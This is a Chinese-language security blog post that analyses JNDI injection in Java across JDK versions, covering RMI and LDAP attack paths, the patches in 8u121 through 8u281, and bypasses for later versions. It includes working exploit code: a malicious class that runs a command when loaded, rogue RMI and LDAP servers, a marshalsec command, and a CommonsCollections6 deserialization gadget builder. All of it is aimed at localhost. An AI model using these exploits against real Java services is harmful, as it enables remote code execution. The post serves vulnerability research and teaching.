<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;</span><br><span class="line">        String referenceUrl=<span class="string">&quot;http://localhost:9999&quot;</span>;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;refer&quot;</span>,<span class="string">&quot;fefer&quot;</span>,referenceUrl);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">refer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;refer&quot;</span>,refer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p> 为什么需要<code>ReferenceWrapper</code>包装呢？</p>
<p> 被Registry绑定的对象必须继承UnicastRemoteObject类，而Reference类并没有实现这个类，所以无法被直接绑定</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211212154638.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211212154716.png"></p>
<h2 id="JNDI注入8u191↓"><a href="#JNDI注入8u191↓" class="headerlink" title="JNDI注入8u191↓"></a>JNDI注入8u191↓</h2><p>通常JNDI注入攻击都是 lookup方法的执行者，一般步骤如下：</p>
<ol>
<li>目标机器调用了<code>InitialContext.lookup(&quot;URL&quot;)</code>，且URL为用户可控</li>
<li>攻击者控制这个URL为一个恶意的RMI服务地址：<code>rmi://&#123;ip&#125;/&#123;port&#125;/name</code></li>
<li>恶意RMI服务会返回一个含有恶意factory的Reference对象</li>
<li>目标获取Reference之后会动态加载factory</li>
<li>攻击者可以在恶意factory的静态代码块，构造方法写入恶意代码，在目标实例化factory的时候被RCE</li>
</ol>
<p>当然，通常会有两种实现方式：LDAP和RMI</p>
<h3 id="RMI（8u121）"><a href="#RMI（8u121）" class="headerlink" title="RMI（8u121）"></a>RMI（8u121）</h3><p>我们先创建一个恶意的类，让服务器托管这个恶意的类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用javac进行编译，放置于服务器</p>
<p>这里要注意一下，要用低版本的jdk进行编译，如果用高版本jdk编译会出现如下问题</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211216102905.png"></p>
<p>当我换了jdk进行编译(jdk版本更换工具推荐 jevn)</p>
<p>然后编写Server端的代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Exp&quot;</span>,<span class="string">&quot;Exp&quot;</span>,<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">calc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;calc&quot;</span>,calc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编写客户端代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">clinet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果客户端lookup方法参数可控的话，命令就可以执行成功，可以被RCE</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211216103047.png"></p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>在此处打上断点进行调试</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211216172905.png"></p>
<p>前几步是从Server端解析传入的URL，到 这一步 RegistryContexr#lookup的方法,</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211216170918.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211216170835.png"></p>
<p>我们可以看到<code>this.registry</code>仍然是<code>RegistryImpl_Stub</code>，执行<code>lookup</code>方法获取的是一个<code>ReferenceWrapper_Stub</code>对象，</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211217124236.png"></p>
<p>在<code>RegistryContext#decodeObject</code>方法中会根据这个ReferenceWrapper_Stub对象获取Reference对象</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211217124528.png"></p>
<p>跟进getReference方法,发现调用了UnicastRef#invoke ⽅法</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211217125350.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218210218.png"></p>
<p>相当于进⾏了⼀次远程⽅法调⽤（⻅ RMI 中 的 “Client 发送请求”），⽽调⽤的⽅法为</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218211834.png"></p>
<p>正好对应着 RMI 服务端中的 ReferenceWrapper#getReference ⽅法（ReferenceWrapper 实现了 RemoteReference 接⼝）：</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211217125847.png"></p>
<p>于是这次远程⽅法调⽤的结果就是返回了远程 ReferenceWrpper 包装的 Reference 对象：</p>
<p>(条件运算符前面成立，返回前面得表达式)</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218212149.png"></p>
<p>继续跟代码，来到 NamingManager#getObjectInstance ⽅法，跟到<code> NamingManager##getObjectFactoryFromReference</code>方法获取factory实例</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218214023.png"></p>
<p>跟了以后发现，首先进行本地加载，加载失败以后，再从codebase加载factory</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218215814.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218220020.png"></p>
<p>其中，下面的LoadClass加载方式为 URLClassLoader，成功加载了恶意代码</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218221857.png"></p>
<p>最后返回factory实例</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218213933.png"></p>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>在 8U121之后，默认的RMI利用方式不再信任codebase</p>
<p>我这里以 8u181为例</p>
<p>在<code>RegistryContext#&lt;static&gt;</code>（末尾处）新增代码</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218222425.png"></p>
<p>在 <code>RegistryContext#decodeObject</code>处</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218222552.png"></p>
<h2 id="LDAP方式"><a href="#LDAP方式" class="headerlink" title="LDAP方式"></a>LDAP方式</h2><p>与RMI方式一样，使用marshalsec开启ldap服务</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalec.jndi.LDAPRefServer http:<span class="comment">//127.0.0.1:8000/#Exp</span></span><br></pre></td></tr></table></figure>



<h3 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">getObjectFactoryFromReference:<span class="number">142</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:<span class="number">189</span>, DirectoryManager (javax.naming.spi)</span><br><span class="line">c_lookup:<span class="number">1085</span>, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:<span class="number">542</span>, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">177</span>, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">94</span>, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br></pre></td></tr></table></figure>

<p>最后仍然是调⽤了 NamingManager#getObjectFactoryFromReference ⽅法。</p>
<h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><p>8u281版本</p>
<p>同上，跟到NamingManager##getObjectFactoryFromReference 方法的loadClass进去之后，会判断trustURLCodebase,长按ctrl+左键</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218230949.png"></p>
<p>会跳到 <code>VersionHelper12</code>中，这个类默认将其定位 false</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218231306.png"></p>
<h2 id="JNDI注入-8u191↑"><a href="#JNDI注入-8u191↑" class="headerlink" title="JNDI注入 8u191↑"></a>JNDI注入 8u191↑</h2><p>高版本的绕过思路有两种：</p>
<ol>
<li>LDAP Server直接返回恶意序列化数据，但是需要目标环境存在Gadget依赖</li>
<li>使用本地的Factory绕过(主要利用了<code>org.apache.naming.factory.BeanFactory</code>类)</li>
</ol>
<h3 id="直接返回序列化数据-LDAP"><a href="#直接返回序列化数据-LDAP" class="headerlink" title="直接返回序列化数据(LDAP)"></a>直接返回序列化数据(LDAP)</h3><p>LDAP Server可以直接改参考marshalsec，修改里面的内容</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> demo2.utils.CommonUtil;</span><br><span class="line"><span class="keyword">import</span> demo2.utils.Utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * LDAP server implementation returning JNDI references</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> mbechler</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">byte</span>[] getCommonsCollections6()&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> Utils.createTemplates(<span class="string">&quot;Calc.class&quot;</span>);</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getClass&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, invokerTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, templates);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        outerMap.clear();</span><br><span class="line">        CommonUtil.setFieldValue(invokerTransformer, <span class="string">&quot;iMethodName&quot;</span>,</span><br><span class="line">                <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> CommonUtil.serialize(expMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] args )</span> &#123;</span><br><span class="line"><span class="comment">//        int port = 1389;</span></span><br><span class="line"><span class="comment">//        if ( args.length &lt; 1 || args[ 0 ].indexOf(&#x27;#&#x27;) &lt; 0 ) &#123;</span></span><br><span class="line"><span class="comment">//            System.err.println(LDAPServer.class.getSimpleName() + &quot; &lt;codebase_url#classname&gt; [&lt;port&gt;]&quot;); //$NON-NLS-1$</span></span><br><span class="line"><span class="comment">//            System.exit(-1);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        else if ( args.length &gt; 1 ) &#123;</span></span><br><span class="line"><span class="comment">//            port = Integer.parseInt(args[ 1 ]);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        String[] tmpArgs = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:7777/#Exp&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> port=<span class="number">8888</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(tmpArgs[<span class="number">0</span>])));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中的Utils类为创建一个模板类，然后设置其属性，其实还是CC链那一套，为了避免冗杂，另分开写</p>
